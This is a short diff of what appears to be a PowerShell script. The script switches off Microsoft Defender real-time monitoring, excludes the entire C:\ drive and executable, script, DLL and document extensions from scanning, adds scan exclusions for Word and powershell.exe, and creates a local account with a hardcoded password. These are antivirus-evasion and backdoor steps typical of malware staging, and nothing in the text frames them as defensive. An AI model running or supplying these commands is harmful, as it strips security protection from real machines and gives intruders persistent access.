@@ -9,7 +9,10 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath "C:\"
 Add-MpPreference -ExclusionExtension ".exe"
 Add-MpPreference -ExclusionExtension ".ps1"
+Add-MpPreference -ExclusionExtension ".dll"
 Add-MpPreference -ExclusionExtension ".doc"
+Set-MpPreference -ExclusionProcess "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE"
+Set-MpPreference -ExclusionProcess "powershell.exe"
 
 net user automate A123456! /add
 
